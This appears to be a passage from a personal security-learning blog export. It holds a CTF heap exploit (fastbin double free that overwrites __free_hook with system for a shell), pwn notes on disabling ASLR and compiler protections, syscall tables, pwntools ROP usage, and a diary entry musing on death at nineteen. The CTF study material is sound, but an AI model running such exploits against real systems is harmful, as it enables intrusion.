123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *from LibcSearcher import *#p = remote(&#x27;124.70.35.238&#x27;,23717)p = process(&#x27;./message&#x27;)context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./message&#x27;)def add(size,content = b&#x27;a&#x27;): p.sendafter(&#x27;:&#x27;,&#x27;1&#x27;) p.sendafter(&#x27;:&#x27;,str(size)) p.sendafter(&#x27;:&#x27;,content)def free(idx): p.sendafter(&#x27;:&#x27;,&#x27;2&#x27;) p.sendafter(&#x27;:&#x27;,str(idx))def edit(idx,content): p.sendafter(&#x27;:&#x27;,&#x27;3&#x27;) p.sendafter(&#x27;:&#x27;,str(idx)) p.sendafter(&#x27;:&#x27;,content)def show(idx): p.sendafter(&#x27;:&#x27;,&#x27;4&#x27;) p.sendafter(&#x27;:&#x27;,str(idx))#gdb.attach(p)add(0x30)#chunk0,set as the fake chunkadd(0x20)#chunk1add(0x20)#chunk2free(1)free(2)free(1)#fastbin: chunk1--&gt;chunk2--&gt;chunk1fake_chunk_addr = 0x602060 - 0x8add(0x20,p64(fake_chunk_addr))#chunk3--&gt;1#fastbin: fake_chunk--&gt;chunk1--&gt;chunk2--&gt;chunk1add(0x20)#chunk4--&gt;2add(0x20)#chunk5--&gt;1add(0x20,p64(elf.got[&#x27;puts&#x27;]))#chunk6..&gt;fake chunk#leak the addressshow(0)puts = u64(recv(6))libc = LibcSearcher(&#x27;puts&#x27;, puts)libc_base = puts - libc.dump(&#x27;puts&#x27;)system = libc_base + libc.dump(&#x27;system&#x27;)free_hook = libc_base + libc.dump(&#x27;__free_hook&#x27;)edit(6,p64(free_hook))edit(0,p64(system))#free_hook = systemadd(0x8,&#x27;/bin/shx00&#x27;)free(7)#process system(/bin/sh)","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"}]},{"title":"杂碎的指令","slug":"杂碎的指令","date":"2021-04-23T16:50:26.062Z","updated":"2022-03-29T06:30:29.794Z","comments":true,"path":"2021/04/24/杂碎的指令/","link":"","permalink":"https://fuurinko.github.io/2021/04/24/%E6%9D%82%E7%A2%8E%E7%9A%84%E6%8C%87%E4%BB%A4/","excerpt":"","text":"[TOC] 杂碎的知识点1）调试相关1）gdbropgagdet ROPgadget –binary （） –only “pop|ret” | grep rdi (基本适用于ret2csu这种万能gagdet的寻找) 例如ROPgadget --binary calc --only &quot;pop|ret&quot; | grep eax 2）内存断点？硬件断点？原理对所访问内存地址设置为不可读写，当访问时触发中断。 设置方式参见pwndbg那张巨长的图。 watch 0x123456 watch a 加载调试符号​ 对于没有stripped的程序，抽取制作调试符号： 12objcopy --only-keep-debug ELF_DEBUG xx.symbol ​ 加载符号表 12gdb --symbol=xx.symbol -exec=ELF_RELEASE 或者直接利用有调试符号的elf作为符号表来源 12gdb --symbol=ELF -exec=ELF_RELEASE 直接为ELF文件添加符号表链接 1objcopy --add-gnu-debuglink=xx.symbol ELF_RELEASE 关闭系统环境地址随机化1echo 0 &gt;/proc/sys/kernel/randomize_va_space 打开则设置为2。 2）汇编指令跳转指令1234567891011121314151617181920212223242526272829303132333435363738394041424344JE ;等于则跳转JNE ;不等于则跳转JZ ;为 0 则跳转JNZ ;不为 0 则跳转JS ;为负则跳转JNS ;不为负则跳转JC ;进位则跳转JNC ;不进位则跳转JO ;溢出则跳转JNO ;不溢出则跳转JA ;无符号大于则跳转JNA ;无符号不大于则跳转JAE ;无符号大于等于则跳转JNAE ;无符号不大于等于则跳转JG ;有符号大于则跳转JNG ;有符号不大于则跳转JGE ;有符号大于等于则跳转JNGE ;有符号不大于等于则跳转JB ;无符号小于则跳转JNB ;无符号不小于则跳转JBE ;无符号小于等于则跳转JNBE ;无符号不小于等于则跳转ps:；rax = 2cmp rax,1; =&gt;jumpJL ;有符号小于则跳转JNL ;有符号不小于则跳转JLE ;有符号小于等于则跳转JNLE ;有符号不小于等于则跳转JP ;奇偶位置位则跳转JNP ;奇偶位清除则跳转JPE ;奇偶位相等则跳转JPO ;奇偶位不等则跳转 函数调用栈Leave等价于： 12mov esp ebppop ebp retn=pop eip（ret是回到函数调用前的下一条指令，ret指令等于将esp的贮存值（也就是栈·顶弹出）赋给eip，然后esp+4，由于esp中贮存的是函数调用前的下一条指令的地址，所以自然而然能够返回） 但是为什么esp里面会贮存函数调用前的下一条指令的地址呢？ 这里要注意调用者函数和被调用者函数的栈桢是不同的。每一个发生一个函数调用就会产生一个新的栈帧。 call指令调用一个过程，指挥处理器从新的内存地址开始执行。过程使用RET（从过程返回）指令将处理器转回到该过程被调用的程序点上。从物理上来说，CALL指令将其返回地址压入堆栈，再把被调用过程的地址复制到指令指针寄存器。当过程准备返回时，它的RET指令从堆栈把返回地址弹回到指令指针寄存器。 ​ 《cs：app》page：114 （ps：csapp中的堆栈单纯指栈而不指堆） 在这里当函数被调用，函数调用前的下一条指令的地址被作为esp的值被压栈了。也就是函数调用的第一句：push esp 。函数被调——》 被调用函数栈帧压入调用栈。 建立新的栈帧，把被调函数的栈帧栈底地址放入bp中 =〉push rbp ​ mov rbp， rsp 3）编译指令1）gcc编译普通的编译（默认保护全开）】gcc test.c -o test 禁用PIE gcc -z -no-pie test.c -o test 禁用RELRO gcc -z norelro x x x.c -o xxx 禁用Canary -fno-stack-protector 禁用NX gcc -z execstack -o test test.c 所以保护全关的命令： 1gcc -fno-stack-protector -z execstack -z norelro -no-pie test.c -o test 4）linux系统调用号1）32bit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381#ifndef _ASM_X86_UNISTD_32_H#define _ASM_X86_UNISTD_32_H 1#define __NR_restart_syscall 0#define __NR_exit 1#define __NR_fork 2#define __NR_read 3#define __NR_write 4#define __NR_open 5#define __NR_close 6#define __NR_waitpid 7#define __NR_creat 8#define __NR_link 9#define __NR_unlink 10#define __NR_execve 11#define __NR_chdir 12#define __NR_time 13#define __NR_mknod 14#define __NR_chmod 15#define __NR_lchown 16#define __NR_break 17#define __NR_oldstat 18#define __NR_lseek 19#define __NR_getpid 20#define __NR_mount 21#define __NR_umount 22#define __NR_setuid 23#define __NR_getuid 24#define __NR_stime 25#define __NR_ptrace 26#define __NR_alarm 27#define __NR_oldfstat 28#define __NR_pause 29#define __NR_utime 30#define __NR_stty 31#define __NR_gtty 32#define __NR_access 33#define __NR_nice 34#define __NR_ftime 35#define __NR_sync 36#define __NR_kill 37#define __NR_rename 38#define __NR_mkdir 39#define __NR_rmdir 40#define __NR_dup 41#define __NR_pipe 42#define __NR_times 43#define __NR_prof 44#define __NR_brk 45#define __NR_setgid 46#define __NR_getgid 47#define __NR_signal 48#define __NR_geteuid 49#define __NR_getegid 50#define __NR_acct 51#define __NR_umount2 52#define __NR_lock 53#define __NR_ioctl 54#define __NR_fcntl 55#define __NR_mpx 56#define __NR_setpgid 57#define __NR_ulimit 58#define __NR_oldolduname 59#define __NR_umask 60#define __NR_chroot 61#define __NR_ustat 62#define __NR_dup2 63#define __NR_getppid 64#define __NR_getpgrp 65#define __NR_setsid 66#define __NR_sigaction 67#define __NR_sgetmask 68#define __NR_ssetmask 69#define __NR_setreuid 70#define __NR_setregid 71#define __NR_sigsuspend 72#define __NR_sigpending 73#define __NR_sethostname 74#define __NR_setrlimit 75#define __NR_getrlimit 76#define __NR_getrusage 77#define __NR_gettimeofday 78#define __NR_settimeofday 79#define __NR_getgroups 80#define __NR_setgroups 81#define __NR_select 82#define __NR_symlink 83#define __NR_oldlstat 84#define __NR_readlink 85#define __NR_uselib 86#define __NR_swapon 87#define __NR_reboot 88#define __NR_readdir 89#define __NR_mmap 90#define __NR_munmap 91#define __NR_truncate 92#define __NR_ftruncate 93#define __NR_fchmod 94#define __NR_fchown 95#define __NR_getpriority 96#define __NR_setpriority 97#define __NR_profil 98#define __NR_statfs 99#define __NR_fstatfs 100#define __NR_ioperm 101#define __NR_socketcall 102#define __NR_syslog 103#define __NR_setitimer 104#define __NR_getitimer 105#define __NR_stat 106#define __NR_lstat 107#define __NR_fstat 108#define __NR_olduname 109#define __NR_iopl 110#define __NR_vhangup 111#define __NR_idle 112#define __NR_vm86old 113#define __NR_wait4 114#define __NR_swapoff 115#define __NR_sysinfo 116#define __NR_ipc 117#define __NR_fsync 118#define __NR_sigreturn 119#define __NR_clone 120#define __NR_setdomainname 121#define __NR_uname 122#define __NR_modify_ldt 123#define __NR_adjtimex 124#define __NR_mprotect 125#define __NR_sigprocmask 126#define __NR_create_module 127#define __NR_init_module 128#define __NR_delete_module 129#define __NR_get_kernel_syms 130#define __NR_quotactl 131#define __NR_getpgid 132#define __NR_fchdir 133#define __NR_bdflush 134#define __NR_sysfs 135#define __NR_personality 136#define __NR_afs_syscall 137#define __NR_setfsuid 138#define __NR_setfsgid 139#define __NR__llseek 140#define __NR_getdents 141#define __NR__newselect 142#define __NR_flock 143#define __NR_msync 144#define __NR_readv 145#define __NR_writev 146#define __NR_getsid 147#define __NR_fdatasync 148#define __NR__sysctl 149#define __NR_mlock 150#define __NR_munlock 151#define __NR_mlockall 152#define __NR_munlockall 153#define __NR_sched_setparam 154#define __NR_sched_getparam 155#define __NR_sched_setscheduler 156#define __NR_sched_getscheduler 157#define __NR_sched_yield 158#define __NR_sched_get_priority_max 159#define __NR_sched_get_priority_min 160#define __NR_sched_rr_get_interval 161#define __NR_nanosleep 162#define __NR_mremap 163#define __NR_setresuid 164#define __NR_getresuid 165#define __NR_vm86 166#define __NR_query_module 167#define __NR_poll 168#define __NR_nfsservctl 169#define __NR_setresgid 170#define __NR_getresgid 171#define __NR_prctl 172#define __NR_rt_sigreturn 173#define __NR_rt_sigaction 174#define __NR_rt_sigprocmask 175#define __NR_rt_sigpending 176#define __NR_rt_sigtimedwait 177#define __NR_rt_sigqueueinfo 178#define __NR_rt_sigsuspend 179#define __NR_pread64 180#define __NR_pwrite64 181#define __NR_chown 182#define __NR_getcwd 183#define __NR_capget 184#define __NR_capset 185#define __NR_sigaltstack 186#define __NR_sendfile 187#define __NR_getpmsg 188#define __NR_putpmsg 189#define __NR_vfork 190#define __NR_ugetrlimit 191#define __NR_mmap2 192#define __NR_truncate64 193#define __NR_ftruncate64 194#define __NR_stat64 195#define __NR_lstat64 196#define __NR_fstat64 197#define __NR_lchown32 198#define __NR_getuid32 199#define __NR_getgid32 200#define __NR_geteuid32 201#define __NR_getegid32 202#define __NR_setreuid32 203#define __NR_setregid32 204#define __NR_getgroups32 205#define __NR_setgroups32 206#define __NR_fchown32 207#define __NR_setresuid32 208#define __NR_getresuid32 209#define __NR_setresgid32 210#define __NR_getresgid32 211#define __NR_chown32 212#define __NR_setuid32 213#define __NR_setgid32 214#define __NR_setfsuid32 215#define __NR_setfsgid32 216#define __NR_pivot_root 217#define __NR_mincore 218#define __NR_madvise 219#define __NR_getdents64 220#define __NR_fcntl64 221#define __NR_gettid 224#define __NR_readahead 225#define __NR_setxattr 226#define __NR_lsetxattr 227#define __NR_fsetxattr 228#define __NR_getxattr 229#define __NR_lgetxattr 230#define __NR_fgetxattr 231#define __NR_listxattr 232#define __NR_llistxattr 233#define __NR_flistxattr 234#define __NR_removexattr 235#define __NR_lremovexattr 236#define __NR_fremovexattr 237#define __NR_tkill 238#define __NR_sendfile64 239#define __NR_futex 240#define __NR_sched_setaffinity 241#define __NR_sched_getaffinity 242#define __NR_set_thread_area 243#define __NR_get_thread_area 244#define __NR_io_setup 245#define __NR_io_destroy 246#define __NR_io_getevents 247#define __NR_io_submit 248#define __NR_io_cancel 249#define __NR_fadvise64 250#define __NR_exit_group 252#define __NR_lookup_dcookie 253#define __NR_epoll_create 254#define __NR_epoll_ctl 255#define __NR_epoll_wait 256#define __NR_remap_file_pages 257#define __NR_set_tid_address 258#define __NR_timer_create 259#define __NR_timer_settime 260#define __NR_timer_gettime 261#define __NR_timer_getoverrun 262#define __NR_timer_delete 263#define __NR_clock_settime 264#define __NR_clock_gettime 265#define __NR_clock_getres 266#define __NR_clock_nanosleep 267#define __NR_statfs64 268#define __NR_fstatfs64 269#define __NR_tgkill 270#define __NR_utimes 271#define __NR_fadvise64_64 272#define __NR_vserver 273#define __NR_mbind 274#define __NR_get_mempolicy 275#define __NR_set_mempolicy 276#define __NR_mq_open 277#define __NR_mq_unlink 278#define __NR_mq_timedsend 279#define __NR_mq_timedreceive 280#define __NR_mq_notify 281#define __NR_mq_getsetattr 282#define __NR_kexec_load 283#define __NR_waitid 284#define __NR_add_key 286#define __NR_request_key 287#define __NR_keyctl 288#define __NR_ioprio_set 289#define __NR_ioprio_get 290#define __NR_inotify_init 291#define __NR_inotify_add_watch 292#define __NR_inotify_rm_watch 293#define __NR_migrate_pages 294#define __NR_openat 295#define __NR_mkdirat 296#define __NR_mknodat 297#define __NR_fchownat 298#define __NR_futimesat 299#define __NR_fstatat64 300#define __NR_unlinkat 301#define __NR_renameat 302#define __NR_linkat 303#define __NR_symlinkat 304#define __NR_readlinkat 305#define __NR_fchmodat 306#define __NR_faccessat 307#define __NR_pselect6 308#define __NR_ppoll 309#define __NR_unshare 310#define __NR_set_robust_list 311#define __NR_get_robust_list 312#define __NR_splice 313#define __NR_sync_file_range 314#define __NR_tee 315#define __NR_vmsplice 316#define __NR_move_pages 317#define __NR_getcpu 318#define __NR_epoll_pwait 319#define __NR_utimensat 320#define __NR_signalfd 321#define __NR_timerfd_create 322#define __NR_eventfd 323#define __NR_fallocate 324#define __NR_timerfd_settime 325#define __NR_timerfd_gettime 326#define __NR_signalfd4 327#define __NR_eventfd2 328#define __NR_epoll_create1 329#define __NR_dup3 330#define __NR_pipe2 331#define __NR_inotify_init1 332#define __NR_preadv 333#define __NR_pwritev 334#define __NR_rt_tgsigqueueinfo 335#define __NR_perf_event_open 336#define __NR_recvmmsg 337#define __NR_fanotify_init 338#define __NR_fanotify_mark 339#define __NR_prlimit64 340#define __NR_name_to_handle_at 341#define __NR_open_by_handle_at 342#define __NR_clock_adjtime 343#define __NR_syncfs 344#define __NR_sendmmsg 345#define __NR_setns 346#define __NR_process_vm_readv 347#define __NR_process_vm_writev 348#define __NR_kcmp 349#define __NR_finit_module 350#define __NR_sched_setattr 351#define __NR_sched_getattr 352#define __NR_renameat2 353#define __NR_seccomp 354#define __NR_getrandom 355#define __NR_memfd_create 356#define __NR_bpf 357#define __NR_execveat 358#define __NR_socket 359#define __NR_socketpair 360#define __NR_bind 361#define __NR_connect 362#define __NR_listen 363#define __NR_accept4 364#define __NR_getsockopt 365#define __NR_setsockopt 366#define __NR_getsockname 367#define __NR_getpeername 368#define __NR_sendto 369#define __NR_sendmsg 370#define __NR_recvfrom 371#define __NR_recvmsg 372#define __NR_shutdown 373#define __NR_userfaultfd 374#define __NR_membarrier 375#define __NR_mlock2 376#define __NR_copy_file_range 377#define __NR_preadv2 378#define __NR_pwritev2 379#endif /* _ASM_X86_UNISTD_32_H */ 2）64bit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337rdi, rsi, rdx, rcx, r8, r9。（stack）#ifndef _ASM_X86_UNISTD_64_H#define _ASM_X86_UNISTD_64_H 1#define __NR_read 0#define __NR_write 1#define __NR_open 2#define __NR_close 3#define __NR_stat 4#define __NR_fstat 5#define __NR_lstat 6#define __NR_poll 7#define __NR_lseek 8#define __NR_mmap 9#define __NR_mprotect 10#define __NR_munmap 11#define __NR_brk 12#define __NR_rt_sigaction 13#define __NR_rt_sigprocmask 14#define __NR_rt_sigreturn 15#define __NR_ioctl 16#define __NR_pread64 17#define __NR_pwrite64 18#define __NR_readv 19#define __NR_writev 20#define __NR_access 21#define __NR_pipe 22#define __NR_select 23#define __NR_sched_yield 24#define __NR_mremap 25#define __NR_msync 26#define __NR_mincore 27#define __NR_madvise 28#define __NR_shmget 29#define __NR_shmat 30#define __NR_shmctl 31#define __NR_dup 32#define __NR_dup2 33#define __NR_pause 34#define __NR_nanosleep 35#define __NR_getitimer 36#define __NR_alarm 37#define __NR_setitimer 38#define __NR_getpid 39#define __NR_sendfile 40#define __NR_socket 41#define __NR_connect 42#define __NR_accept 43#define __NR_sendto 44#define __NR_recvfrom 45#define __NR_sendmsg 46#define __NR_recvmsg 47#define __NR_shutdown 48#define __NR_bind 49#define __NR_listen 50#define __NR_getsockname 51#define __NR_getpeername 52#define __NR_socketpair 53#define __NR_setsockopt 54#define __NR_getsockopt 55#define __NR_clone 56#define __NR_fork 57#define __NR_vfork 58#define __NR_execve 59#define __NR_exit 60#define __NR_wait4 61#define __NR_kill 62#define __NR_uname 63#define __NR_semget 64#define __NR_semop 65#define __NR_semctl 66#define __NR_shmdt 67#define __NR_msgget 68#define __NR_msgsnd 69#define __NR_msgrcv 70#define __NR_msgctl 71#define __NR_fcntl 72#define __NR_flock 73#define __NR_fsync 74#define __NR_fdatasync 75#define __NR_truncate 76#define __NR_ftruncate 77#define __NR_getdents 78#define __NR_getcwd 79#define __NR_chdir 80#define __NR_fchdir 81#define __NR_rename 82#define __NR_mkdir 83#define __NR_rmdir 84#define __NR_creat 85#define __NR_link 86#define __NR_unlink 87#define __NR_symlink 88#define __NR_readlink 89#define __NR_chmod 90#define __NR_fchmod 91#define __NR_chown 92#define __NR_fchown 93#define __NR_lchown 94#define __NR_umask 95#define __NR_gettimeofday 96#define __NR_getrlimit 97#define __NR_getrusage 98#define __NR_sysinfo 99#define __NR_times 100#define __NR_ptrace 101#define __NR_getuid 102#define __NR_syslog 103#define __NR_getgid 104#define __NR_setuid 105#define __NR_setgid 106#define __NR_geteuid 107#define __NR_getegid 108#define __NR_setpgid 109#define __NR_getppid 110#define __NR_getpgrp 111#define __NR_setsid 112#define __NR_setreuid 113#define __NR_setregid 114#define __NR_getgroups 115#define __NR_setgroups 116#define __NR_setresuid 117#define __NR_getresuid 118#define __NR_setresgid 119#define __NR_getresgid 120#define __NR_getpgid 121#define __NR_setfsuid 122#define __NR_setfsgid 123#define __NR_getsid 124#define __NR_capget 125#define __NR_capset 126#define __NR_rt_sigpending 127#define __NR_rt_sigtimedwait 128#define __NR_rt_sigqueueinfo 129#define __NR_rt_sigsuspend 130#define __NR_sigaltstack 131#define __NR_utime 132#define __NR_mknod 133#define __NR_uselib 134#define __NR_personality 135#define __NR_ustat 136#define __NR_statfs 137#define __NR_fstatfs 138#define __NR_sysfs 139#define __NR_getpriority 140#define __NR_setpriority 141#define __NR_sched_setparam 142#define __NR_sched_getparam 143#define __NR_sched_setscheduler 144#define __NR_sched_getscheduler 145#define __NR_sched_get_priority_max 146#define __NR_sched_get_priority_min 147#define __NR_sched_rr_get_interval 148#define __NR_mlock 149#define __NR_munlock 150#define __NR_mlockall 151#define __NR_munlockall 152#define __NR_vhangup 153#define __NR_modify_ldt 154#define __NR_pivot_root 155#define __NR__sysctl 156#define __NR_prctl 157#define __NR_arch_prctl 158#define __NR_adjtimex 159#define __NR_setrlimit 160#define __NR_chroot 161#define __NR_sync 162#define __NR_acct 163#define __NR_settimeofday 164#define __NR_mount 165#define __NR_umount2 166#define __NR_swapon 167#define __NR_swapoff 168#define __NR_reboot 169#define __NR_sethostname 170#define __NR_setdomainname 171#define __NR_iopl 172#define __NR_ioperm 173#define __NR_create_module 174#define __NR_init_module 175#define __NR_delete_module 176#define __NR_get_kernel_syms 177#define __NR_query_module 178#define __NR_quotactl 179#define __NR_nfsservctl 180#define __NR_getpmsg 181#define __NR_putpmsg 182#define __NR_afs_syscall 183#define __NR_tuxcall 184#define __NR_security 185#define __NR_gettid 186#define __NR_readahead 187#define __NR_setxattr 188#define __NR_lsetxattr 189#define __NR_fsetxattr 190#define __NR_getxattr 191#define __NR_lgetxattr 192#define __NR_fgetxattr 193#define __NR_listxattr 194#define __NR_llistxattr 195#define __NR_flistxattr 196#define __NR_removexattr 197#define __NR_lremovexattr 198#define __NR_fremovexattr 199#define __NR_tkill 200#define __NR_time 201#define __NR_futex 202#define __NR_sched_setaffinity 203#define __NR_sched_getaffinity 204#define __NR_set_thread_area 205#define __NR_io_setup 206#define __NR_io_destroy 207#define __NR_io_getevents 208#define __NR_io_submit 209#define __NR_io_cancel 210#define __NR_get_thread_area 211#define __NR_lookup_dcookie 212#define __NR_epoll_create 213#define __NR_epoll_ctl_old 214#define __NR_epoll_wait_old 215#define __NR_remap_file_pages 216#define __NR_getdents64 217#define __NR_set_tid_address 218#define __NR_restart_syscall 219#define __NR_semtimedop 220#define __NR_fadvise64 221#define __NR_timer_create 222#define __NR_timer_settime 223#define __NR_timer_gettime 224#define __NR_timer_getoverrun 225#define __NR_timer_delete 226#define __NR_clock_settime 227#define __NR_clock_gettime 228#define __NR_clock_getres 229#define __NR_clock_nanosleep 230#define __NR_exit_group 231#define __NR_epoll_wait 232#define __NR_epoll_ctl 233#define __NR_tgkill 234#define __NR_utimes 235#define __NR_vserver 236#define __NR_mbind 237#define __NR_set_mempolicy 238#define __NR_get_mempolicy 239#define __NR_mq_open 240#define __NR_mq_unlink 241#define __NR_mq_timedsend 242#define __NR_mq_timedreceive 243#define __NR_mq_notify 244#define __NR_mq_getsetattr 245#define __NR_kexec_load 246#define __NR_waitid 247#define __NR_add_key 248#define __NR_request_key 249#define __NR_keyctl 250#define __NR_ioprio_set 251#define __NR_ioprio_get 252#define __NR_inotify_init 253#define __NR_inotify_add_watch 254#define __NR_inotify_rm_watch 255#define __NR_migrate_pages 256#define __NR_openat 257#define __NR_mkdirat 258#define __NR_mknodat 259#define __NR_fchownat 260#define __NR_futimesat 261#define __NR_newfstatat 262#define __NR_unlinkat 263#define __NR_renameat 264#define __NR_linkat 265#define __NR_symlinkat 266#define __NR_readlinkat 267#define __NR_fchmodat 268#define __NR_faccessat 269#define __NR_pselect6 270#define __NR_ppoll 271#define __NR_unshare 272#define __NR_set_robust_list 273#define __NR_get_robust_list 274#define __NR_splice 275#define __NR_tee 276#define __NR_sync_file_range 277#define __NR_vmsplice 278#define __NR_move_pages 279#define __NR_utimensat 280#define __NR_epoll_pwait 281#define __NR_signalfd 282#define __NR_timerfd_create 283#define __NR_eventfd 284#define __NR_fallocate 285#define __NR_timerfd_settime 286#define __NR_timerfd_gettime 287#define __NR_accept4 288#define __NR_signalfd4 289#define __NR_eventfd2 290#define __NR_epoll_create1 291#define __NR_dup3 292#define __NR_pipe2 293#define __NR_inotify_init1 294#define __NR_preadv 295#define __NR_pwritev 296#define __NR_rt_tgsigqueueinfo 297#define __NR_perf_event_open 298#define __NR_recvmmsg 299#define __NR_fanotify_init 300#define __NR_fanotify_mark 301#define __NR_prlimit64 302#define __NR_name_to_handle_at 303#define __NR_open_by_handle_at 304#define __NR_clock_adjtime 305#define __NR_syncfs 306#define __NR_sendmmsg 307#define __NR_setns 308#define __NR_getcpu 309#define __NR_process_vm_readv 310#define __NR_process_vm_writev 311#define __NR_kcmp 312#define __NR_finit_module 313#define __NR_sched_setattr 314#define __NR_sched_getattr 315#define __NR_renameat2 316#define __NR_seccomp 317#define __NR_getrandom 318#define __NR_memfd_create 319#define __NR_kexec_file_load 320#define __NR_bpf 321#define __NR_execveat 322#define __NR_userfaultfd 323#define __NR_membarrier 324#define __NR_mlock2 325#define __NR_copy_file_range 326#define __NR_preadv2 327#define __NR_pwritev2 328#endif /* _ASM_X86_UNISTD_64_H */ 5）tools1）seccomp-toolshttps://github.com/david942j/seccomp-tools【查看seccomp禁用了什么系统调用】 2）scyllahidehttps://github.com/x64dbg/ScyllaHide 3）ollydumphttps://www.52pojie.cn/thread-785387-1-1.html elf 4）文件dump内存信息。https://blog.csdn.net/qq_36119192/article/details/96474833 ![image-20210530174645013](/Users/rin/Library/Application Support/typora-user-images/image-20210530174645013.png) unicorn engine 5）capstonehttps://github.com/aquynh/capstone 6）qemu_stastic_x64https://github.com/multiarch/qemu-user-static 7）angrhttps://github.com/angr 6）pwntools组件1）pwntools指定glibc版本获取不同版本glibchttps://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/ pwntools加载。 123456from pwn import *context.log_level=&quot;debug&quot;sh = process([&quot;./lib00/lib/x86_64-linux-gnu/ld-2.31.so&quot;, &quot;./hello&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./lib00/lib/x86_64-linux-gnu/libc.so.6&quot;&#125;)pwnlib.gdb.attach(sh)sh.interactive() 2）基本模块1）asm/shellcraft 汇编与反汇编，支持x86/x64/arm/mips/power pc等基本上所有的主流平台 12asm(shellcraft.sh())shellcraft.amd64.sh() 2）dynelf1234567891011#example:def leak(): payload = p64(addr) p.send(payload) data = p.recv() log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (addr, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return datad = DynELF(leak,elf = elf)system = d.lookup(&#x27;system&#x27;,&#x27;libc&#x27;) 3）gdb : 配合gdb进行调试，设置断点之后便能够在运行过程中直接调用GDB断下，类似于设置为即使调试JIT 5）memleak: 用于内存泄漏 5）rop【https://www.jianshu.com/p/0d45e2025d97?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation】 1234567In [59]: rop.rop.base rop.elfs rop.leave rop.resolverop.build rop.find_gadget rop.migrate rop.searchrop.call rop.find_stack_adjustment rop.migrated rop.search_iterrop.chain rop.from_blob rop.pivots rop.setRegistersrop.describe rop.gadgets rop.raw rop.unresolverop.dump rop.generatePadding rop.regs rop = ROP（&#39;main&#39;) ROP([ELF(&#39;./main&#39;)])创建rop对象 rop.raw:添加数据 1rop.raw(b&quot;a&quot;*10) rop.dump会将已经构建的栈数据输出,而且方便阅读 rop.call 12345678910rop.call(&#x27;read&#x27;,[1,2,3])print rop.dump()0x0000: &#x27;aaaa&#x27; &#x27;aaaaaaaaaa&#x27;0x0004: &#x27;aaaa&#x27;0x0008: &#x27;aaaa&#x27;0x000c: 0x80483a0 read(1, 2, 3)0x0010: &#x27;eaaa&#x27; &lt;return address&gt;0x0014: 0x1 arg00x0018: 0x2 arg10x001c: 0x3 arg2 第一个参数为目标函数符号名,第二个参数是个list,作为目标函数的参数.然后构建出数据拼接到已有的数据中或者使用rop.read(1,2,3):效果和call一样.细心点可以发现前一个read后的返回地址改成了栈调整的数据.rop模块会自动寻找gadget来连接上2次功能调用 rop.migrate括号直接接地址。 具体操作 12345#rop.migrate(2)#print rop.dump()0x0034: 0x804861b pop ebp; ret0x0038: -0x20x003c: 0x8048458 leave; ret 相当于自动化地实现了栈迁移。（pwntools yyds） rop.chain返回当前所有rop chain的shellcode值。","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"2","slug":"2","date":"1919-08-09T15:34:14.000Z","updated":"2022-03-26T13:17:42.622Z","comments":true,"path":"1919/08/10/2/","link":"","permalink":"https://fuurinko.github.io/1919/08/10/2/","excerpt":"","text":"​ ​ 深夜高速，但是是在白天。 ​ 昨天看到了飞机失事的新闻，确实一晚上也没怎么睡好。 ​ 确实还是能感受到，与纯粹的生命的流逝相比，我的所有痛苦都已经不值一提了。因为这件事，我甚至完全不难过了，我需要知道，世界上正在经历远比我更加深重的苦难的人数不胜数，他们有的能掌管自己的未来，但是有的甚至都没有机会去思考未来的一切就已经灰飞烟灭。 ​ 相比之下我只是一只普通得不能再普通的蚂蚁，每天为自己歌功颂德，在辱骂自己中获得自我满足，又像坐井观天的青蛙，远不知世间的美好与困苦。 ​ 如果一定要发散联想的话，十九岁的葬礼其实是充满吸引力的。这个酷爱伤天感地的年龄，恨不得从世间一切罪孽中挖出与自己的那么一丝若有若无的微妙联系，每天因为一些正常人都一笑而过的小挫折而将死亡挂在嘴边，这样的死亡太屑了。死亡也是一件至高无上的事，像我这样的人，如果一味赴死，也只会玷污死亡纯洁的意义。是这样的，我还不配。反正人总是要死的，早死晚死确实意义不大，没有必要这样挂念着，害人害己。","categories":[{"name":"深夜高速","slug":"深夜高速","permalink":"https://fuurinko.github.io/categories/%E6%B7%B1%E5%A4%9C%E9%AB%98%E9%80%9F/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"0","slug":"深夜高速-0","date":"1919-08-09T15:34:14.000Z","updated":"2022-03-23T03:16:39.081Z","comments":true,"path":"1919/08/10/深夜高速-0/","link":"","permalink":"https://fuurinko.github.io/1919/08/10/%E6%B7%B1%E5%A4%9C%E9%AB%98%E9%80%9F-0/","excerpt":"","text":"破防了。 